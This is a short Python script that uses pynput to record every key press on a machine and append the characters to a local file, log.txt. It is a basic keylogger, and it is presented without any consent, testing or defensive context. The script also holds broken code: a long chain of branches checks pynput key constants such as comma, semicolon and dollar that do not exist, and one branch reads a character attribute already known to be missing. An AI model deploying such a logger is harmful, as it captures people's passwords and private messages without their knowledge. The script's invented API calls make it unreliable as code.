import pynput
from pynput import keyboard

def on_press(key):
    try:
        # Check if the key pressed is a letter or a number
        if hasattr(key, "char"):
            # Write the character to the file
            file.write(key.char)
        # Check if the key pressed is a space
        elif key == keyboard.Key.space:
            # Write a space to the file
            file.write(" ")
        # Check if the key pressed is a period
        elif key.char == ".":
            # Write a period to the file
            file.write(".")
        # Check if the key pressed is a comma
        elif key == keyboard.Key.comma:
            # Write a comma to the file
            file.write(",")
        # Check if the key pressed is a semicolon
        elif key == keyboard.Key.semicolon:
            # Write a semicolon to the file
            file.write(";")
        # Check if the key pressed is a colon
        elif key == keyboard.Key.colon:
            # Write a colon to the file
            file.write(":")
        # Check if the key pressed is a question mark
        elif key == keyboard.Key.question:
            # Write a question mark to the file
            file.write("?")
        # Check if the key pressed is an exclamation point
        elif key == keyboard.Key.exclamation:
            # Write an exclamation point to the file
            file.write("!")
        # Check if the key pressed is an at sign
        elif key == keyboard.Key.at:
            # Write an at sign to the file
            file.write("@")
        # Check if the key pressed is a number sign
        elif key == keyboard.Key.number:
            # Write a number sign to the file
            file.write("#")
        # Check if the key pressed is a dollar sign
        elif key == keyboard.Key.dollar:
            # Write a dollar sign to the file
            file.write("$")
        # Check if the key pressed is a percent sign
        elif key == keyboard.Key.percent:
            # Write a percent sign to the file
            file.write("%")
        # Check if the key pressed is a caret
        elif key == keyboard.Key.caret:
            # Write a caret to the file
            file.write("^")
        # Check if the key pressed is an ampersand
        elif key == keyboard.Key.ampersand:
            # Write an ampersand to the file
            file.write("&")
        # Check if the key pressed is an asterisk
        elif key == keyboard.Key.asterisk:
            # Write an asterisk to the file
            file.write("*")
        # Check if the key pressed is a left parenthesis
        elif key == keyboard.Key.left_parenthesis:
            # Write a left parenthesis to the file
            file.write("(") 
        # Check if the key pressed is a right parenthesis
        elif key == keyboard.Key.right_parenthesis:
            # Write a right parenthesis to the file
            file.write(")")
        # Check if the key pressed is a hyphen
        elif key == keyboard.Key.hyphen:
            # Write a hyphen to the file
            file.write("-")
        # Check if the key pressed is an underscore
        elif key == keyboard.Key.underscore:
            # Write an underscore to the file
            file.write("_")
        # Check if the key pressed is a plus sign
        elif key == keyboard.Key.plus:
            # Write a plus sign to the file
            file.write("+")
        # Check if the key pressed is an equals sign
        elif key == keyboard.Key.equal:
            # Write an equals sign to the file
            file.write("=")
        # Check if the key pressed is a left square bracket
        elif key == keyboard.Key.left_square_bracket:
            # Write a left square bracket to the file
            file.write("[")
        # Check if the key pressed is a right square bracket
        elif key == keyboard.Key.right_square_bracket:
            # Write a right square bracket to the file
            file.write("]")
        # Check if the key pressed is a backslash
        elif key == keyboard.Key.backslash:
            # Write a backslash to the file
            file.write("\\")
        # Check if the key pressed is a forward slash
        elif key == keyboard.Key.forward_slash:
            # Write a forward slash to the file
            file.write("/")
        # Check if the key pressed is a less than sign
        elif key == keyboard.Key.less_than:
            # Write a less than sign to the file
            file.write("<")
        # Check if the key pressed is a greater than sign
        elif key == keyboard.Key.greater_than:
            # Write a greater than sign to the file
            file.write(">")
        # Check if the key pressed is a vertical bar
        elif key == keyboard.Key.vertical_bar:
            # Write a vertical bar to the file
            file.write("|")
    except AttributeError:
        # Key object does not have a char attribute
        pass

    
# Open a file to write the characters to
with open("log.txt", "a") as file:
    # Create a keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    # Start the listener
    listener.start()
    # Wait for the listener to stop
    listener.join()
